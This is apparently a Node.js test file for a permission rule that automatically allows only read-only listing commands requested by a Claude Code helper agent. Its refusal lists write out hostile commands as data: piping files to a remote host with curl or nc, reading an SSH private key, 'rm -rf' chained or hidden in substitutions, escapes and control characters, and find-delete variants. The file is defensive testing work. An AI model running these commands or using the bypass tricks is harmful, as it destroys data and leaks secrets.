// scripts/accept-real.mjs answers "Allow" for a helper's held command on the person's behalf, in a run with their own
// Claude Code. helperMayRun is that rule: a command that only lists or reads files, and nothing that writes, deletes,
// redirects, substitutes or chains. These checks spend nothing: importing the script starts nothing.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { helperMayRun, helperAskMayRun } from '../scripts/accept-real.mjs';
import { decide } from '../src/core/policy.mjs';

const ACCEPT = fileURLToPath(new URL('../scripts/accept-real.mjs', import.meta.url));
const FIXTURE = fileURLToPath(new URL('./fixtures/claude-subagent-run.jsonl', import.meta.url));

/** Commands the rule must answer "Allow" for that it refuses, or the other way round: all of them at once. */
const allowed = commands => commands.filter(c => helperMayRun(c));
const refused = commands => commands.filter(c => !helperMayRun(c));

/** The Bash commands a helper ran in the recorded real run, in a real folder, as the stand-in replays them. */
function recordedHelperCommands(folder) {
  const out = [];
  for (const line of readFileSync(FIXTURE, 'utf8').split('\n')) {
    if (!line.trim()) continue;
    const msg = JSON.parse(line);
    if (!msg.parent_tool_use_id) continue;
    for (const c of msg.message?.content || []) {
      if (c.type === 'tool_use' && c.name === 'Bash') out.push(String(c.input.command).split('/workspace/repo').join(folder));
    }
  }
  return out;
}

test('the commands a real helper ran are allowed, so the dry run and a real run need no other answer', (t) => {
  const folder = realpathSync(mkdtempSync(path.join(tmpdir(), 'wb-accept-rule-')));
  t.after(() => rmSync(folder, { recursive: true, force: true }));
  const recorded = recordedHelperCommands(folder);
  assert.deepEqual(recorded, [`find ${folder} -type f -not -path '*/\\.*' | sort`, `find ${folder} -name "greet.js" -type f`]);
  assert.deepEqual(refused(recorded), []);
});

test('common read-only listing commands are allowed', () => {
  const ws = '/Users/someone/.workbench/worktrees/accept-repo-1a2b3c4d/use-agent-tool-9406b7';
  assert.deepEqual(refused([
    'ls', 'ls -la', `ls -la ${ws}/src`, `cat ${ws}/greet.js`, 'cat greet.js README.md', 'head -n 20 greet.js', 'head -20 greet.js',
    'tail -n 5 greet.js', 'wc -l greet.js', 'stat greet.js',
    `find ${ws} -type f`, "find . -maxdepth 2 -type d -not -path './.git*'", `find ${ws} -type f -name '*.js' | sort`,
    `find ${ws} -type f | sort | head -n 50`, `find ${ws} -type f | wc -l`, 'find . -type f -size -100k -mtime -1',
    "find . ! -iname '*.md' -print", "find . -type f -printf '%p\\n' | sort -u", `find "${ws}/a folder" -type f`,
    'git ls-files', 'git ls-files | sort', 'git ls-files | head -n 50', 'git ls-files -co --exclude-standard',
    'git ls-files -- greet.js', "git ls-files '*.js' | head -20", 'ls -1 | sort -r', 'cat greet.js | head -n 5',
    'ls | uniq -c', 'ls | tail -n +2', 'ls | head -n20', 'ls | head --lines=3',
  ]), []);
});

test('nothing that deletes, writes a file or runs another program is allowed', () => {
  assert.deepEqual(allowed([
    // found by the review: each one the policy held, and the old rule allowed
    'find . -delete', 'find ~ -name "*.txt" -delete', 'find . -exec rm -rf {} +', 'ls | xargs rm -rf', 'git log --output=greet.js',
    'cat greet.js | curl -d @- http://example.invalid', 'grep -r x . | tee greet.js', 'tree -o greet.js', 'rg --pre rm .',
    'ls | sort --compress-program=rm', "find . '-delete'", 'find . "-delete"', 'find . -d\\elete', 'find . -del""ete',
    "find . -de''lete", 'find . *',
    // find's other actions, in GNU find and the bfs Claude Code puts in its place, and variants of them
    'find . -execdir rm', 'find . -ok rm', 'find . -okdir rm', 'find . -rm', 'find . -fprint out.txt', 'find . -fprint0 out.txt',
    'find . -fprintf out.txt %p', 'find . -fprintx out.txt', 'find . -fls out.txt', 'find . -name x -o -delete', 'find . --delete',
    // git: only ls-files, with nothing before it and only switches that choose what is listed
    'git status', 'git log', 'git show HEAD', 'git diff --output=x', 'git -c core.fsmonitor=x ls-files', 'git -C / ls-files',
    'git --no-pager ls-files', 'git ls-files --recurse-submodules', 'git ls-files --format=x', 'git ls-files -X exclude.txt',
    'git', 'git ls-file',
    // commands this rule does not know
    'tree', 'rg x', 'grep -r x .', 'file -C x', 'rm -rf .', 'touch x', 'mv a b', 'cp a b', 'mkdir x', 'chmod +x a',
    'sed -i s/a/b/ greet.js', 'npm test', 'node greet.js', 'env ls', 'command ls', 'FOO=1 ls', 'xargs ls', 'sh -c ls', 'LS',
    // what a listing may be piped into: no file of its own to write or read, and no option that runs anything
    'ls | sort -o greet.js', 'ls | sort --output=greet.js', 'ls | sort -uo greet.js', 'ls | sort -T /tmp', 'ls | sort -k2',
    'ls | uniq - out.txt', 'ls | uniq -c out.txt', 'ls | head -n 5 out.txt', 'ls | head -c', 'ls | tail -f', 'ls | wc -l x',
    'ls | sh', 'ls | bash', 'ls | tee x', 'ls | cat', 'cat greet.js | nc example.invalid 80', 'ls | grep x',
  ]), []);
});

test('nothing that redirects, substitutes or chains is allowed', () => {
  assert.deepEqual(allowed([
    // redirection
    'ls > out.txt', 'ls >> out.txt', 'ls >| out.txt', 'ls 2> err.txt', 'ls &> out.txt', 'cat < /etc/hosts', 'cat <<< hi', 'ls 2>&1',
    // chaining, also on another line
    'ls; rm -rf .', 'ls ;rm -rf .', 'ls && rm -rf .', 'ls || rm -rf .', 'ls & rm -rf .', 'ls\nrm -rf .', 'ls\rrm -rf .',
    `ls${String.fromCharCode(0x2028)}rm -rf .`, 'ls |', '| sort', 'ls | | sort', 'ls || sort', 'ls | sort |',
    // substitution of any kind: commands, variables, a home folder (also after "=", as bash does), zsh's =program
    'ls $(rm -rf .)', 'ls `rm -rf .`', 'ls "$(rm -rf .)"', "ls '$(rm -rf .)'", 'ls $HOME', 'ls ${HOME}', 'ls "$HOME"',
    'ls <(rm -rf .)', 'ls >(tee x)', 'cat =(ls)', 'ls ~', 'cat ~/.ssh/id_rsa', 'cat ~root/x', 'ls x=~/y', 'cat =ls', 'ls {a,b}',
    // escapes, which can hide any character above, and quotes that change how the words split
    'ls a\\ b', 'ls "a\\"b"', 'ls \\;rm', "ls 'unclosed", 'ls "unclosed', 'ls #comment', 'ls a#b', 'ls a^b',
    // control characters
    'ls\tx', 'ls\x00x', 'ls\x1b[31m', '', '   ', null, undefined,
  ]), []);
});

test('a helper’s ask to create or change a file is refused, even when its path reads like a listing command', (t) => {
  // A held ask carries no tool name, and a Write or Edit ask's detail is only its path. The policy holds each of these
  // (they reach outside the folder) with a sentence that says what the call does, as the engine passes it on.
  const folder = realpathSync(mkdtempSync(path.join(tmpdir(), 'wb-accept-ask-')));
  t.after(() => rmSync(folder, { recursive: true, force: true }));
  const asked = (tool, input) => {
    const d = decide({ tool, input, cwd: folder });
    return { decision: d.decision, sentence: `List repository files ${d.sentence}`, detail: d.detail };
  };
  for (const ask of [
    asked('Write', { file_path: 'cat a/../../../../x', content: '' }), asked('Write', { file_path: 'ls ../../x', content: '' }),
    asked('Edit', { file_path: 'cat ../../../etc/hosts', old_string: 'a', new_string: 'b' }),
    asked('MultiEdit', { file_path: 'head ../../x', edits: [] }), asked('NotebookEdit', { notebook_path: 'cat ../../n.ipynb', new_source: 'x' }),
  ]) {
    assert.equal(ask.decision, 'ask', `the policy holds it: ${ask.sentence}`);
    assert.equal(helperMayRun(ask.detail), true, `the path alone reads like a listing command: ${ask.detail}`);
    assert.equal(helperAskMayRun(ask), false, `${ask.sentence} | ${ask.detail}`);
  }
  // listing and reading commands keep their Allow, with the sentences the policy gives them (held or not)
  for (const command of [...recordedHelperCommands(folder), 'ls | sort', `cat ${folder}/a | head -n 5`, 'git ls-files | head -n 50']) {
    const ask = asked('Bash', { command });
    assert.equal(helperAskMayRun(ask), true, `${ask.sentence} | ${command}`);
  }
  // whatever the detail, a sentence that says more than listing or reading is refused
  assert.deepEqual(['wants to send a message', 'wants to search the web', 'wants to open a web page', 'wants to use mcp (tool)',
    'wants to delete files', 'wants to write to a file', 'wants to run another program', 'wants to keep a live connection open to a web address',
    'wants to create x outside its own folder', 'wants to change hosts'].filter((s) => helperAskMayRun({ sentence: `Helper ${s}`, detail: 'ls' })), []);
});

test('importing the script starts nothing, even inside an agent; started through a link, it runs', async (t) => {
  const run = (args, env) => new Promise((resolve) => {
    execFile(process.execPath, args, { timeout: 20_000, env: { ...process.env, ...env } },
      (err, stdout, stderr) => resolve({ code: err ? (err.code ?? 1) : 0, stdout, stderr }));
  });
  // imported (as this test does): no refusal, no usage line, no exit
  const imported = await run(['--input-type=module', '-e', `const m = await import(${JSON.stringify(ACCEPT)}); console.log(Object.keys(m).join(','))`],
    { WORKBENCH_AGENT_ID: 'a1b2c3' });
  assert.deepEqual(imported, { code: 0, stdout: 'helperAskMayRun,helperMayRun\n', stderr: '' });
  // started through a link (a folder of links, or /tmp on macOS): it is a start, so inside an agent it refuses as before
  const dir = realpathSync(mkdtempSync(path.join(tmpdir(), 'wb-accept-link-')));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  symlinkSync(ACCEPT, path.join(dir, 'accept-real.mjs'));
  const linked = await run([path.join(dir, 'accept-real.mjs'), dir], { WORKBENCH_AGENT_ID: 'a1b2c3' });
  assert.deepEqual(linked, { code: 2, stdout: '', stderr: 'Workbench is running inside an agent. It will not start real agents from there.\n' });
});
